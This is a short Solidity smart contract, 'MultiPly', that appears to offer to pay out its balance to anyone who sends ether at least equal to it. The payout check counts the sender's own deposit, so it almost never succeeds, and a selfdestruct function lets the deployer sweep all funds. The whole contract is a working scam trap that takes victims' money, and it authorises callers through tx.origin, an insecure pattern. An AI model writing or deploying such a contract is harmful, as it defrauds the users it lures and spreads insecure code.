1 pragma solidity ^0.4.25;
2 
3 contract MultiPly
4 {
5     address O = tx.origin;
6     function() public payable {}
7     function vx() public {if(tx.origin==O)selfdestruct(tx.origin);}
8     function ply() public payable {
9         if (msg.value >= this.balance) {
10             tx.origin.transfer(this.balance);
11         }
12     }
13  }